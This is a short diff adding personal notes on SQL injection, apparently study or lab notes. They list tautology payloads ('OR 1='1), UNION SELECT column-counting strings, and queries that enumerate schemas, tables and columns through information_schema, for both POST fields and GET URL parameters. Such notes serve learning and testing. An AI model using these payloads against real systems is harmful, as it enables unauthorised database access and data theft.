@@ -1,0 +1,30 @@
+SQL injection
+
+
+POST method
+
+- test this first to see if its vulnerable
+ 'OR 1='1 
+
+- to find which input is vulnerable
+ (name or number) 'OR 1='1
+
+- then go into union statement
+ (name or number)' UNION SELECT 1,2,3,4,5 FROM information_schema.columns; #
+		(number of columns with numbers)
+
+- then the golden statement
+ (name)' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #
+
+
+GET method
+In URL
+
+- change URL number after Selection=#
+selection=# or 1=1
+
+- identify number of columns
+selection=# Union SELECT 1,2,3,4,5 (iterate through numbers)
+
+UNION SELECT 1,table_schema,table_name,column_name FROM information_schema.tables
+		(1,2,... can change based on iteration of numbers)
